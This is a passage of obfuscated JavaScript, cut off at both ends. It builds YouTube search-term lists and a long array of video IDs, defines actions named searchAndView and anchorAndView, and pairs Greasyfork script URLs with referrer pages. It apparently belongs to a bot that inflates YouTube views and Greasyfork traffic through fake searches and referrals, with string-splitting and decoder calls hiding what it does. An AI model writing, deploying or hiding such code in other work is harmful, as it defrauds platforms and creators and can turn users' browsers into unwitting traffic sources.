searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + Y(0x3) + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + Y(0x1c) + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + Y(0x1f) + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1bb9 + -0x5 * -0x594 + -0x3 * 0xb)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x8ef * -0x3 + 0xa3 * -0x2f + 0x32a)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1354 * 0x1 + -0x3 * 0x86 + 0x35 * 0x65);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    Z(0x11, '4Fvs') + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    Y(0x1) + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    Z(0xe, 'KHoA') + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    Z(0x2, 'LDz9') + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    Z(0x19, 'QGIE') + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    Y(0xf) + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    Y(0x14) + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    Z(0x12, 'Y0*H') + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    Y(0x17) + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    a0(0x5) + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a0(0x1b) + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + Z(0x4, '8^Fs') + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + Z(0xd, 'iQ2%') + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
